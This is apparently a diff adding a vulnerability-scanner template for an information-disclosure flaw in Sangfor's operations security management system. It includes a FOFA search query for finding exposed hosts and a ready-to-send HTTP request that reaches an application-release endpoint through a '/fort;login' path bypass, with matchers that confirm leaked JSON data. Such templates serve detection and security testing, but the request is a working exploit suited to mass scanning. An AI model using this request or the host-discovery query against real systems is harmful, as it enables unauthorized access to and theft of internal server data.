@@ -1,0 +1,26 @@
+## id: VEID-2026-11119
+## name: 深信服运维安全管理系统 get_all_application_release 信息泄露
+## author: hack007x
+## severity: high
+## tags: veid,info,veid2026
+## description: 深信服运维安全管理系统 get_all_application_release 信息泄露，导致数据信息泄露或者导致服务器被控制。
+## affects: 深信服运维安全管理系统
+## fofa-query: body="/fort/login" && header="FORTSESSIONID"
+## verification: true
+
+
+
+GET /fort;login/app/get_all_application_release HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: header["Content-Type"] contains "json"
+#@ matcher: body contains '"fortApplicationAeleaseServers"' || body  contains '"fortDescription"'
+#@ matcher: status_code == 200
+
+
+
+
+# @VEIL-STAMP: c7bb1b7b38f96b4c027f37ebcf29dc730474f8e1a9d4772f987b709446c666cd
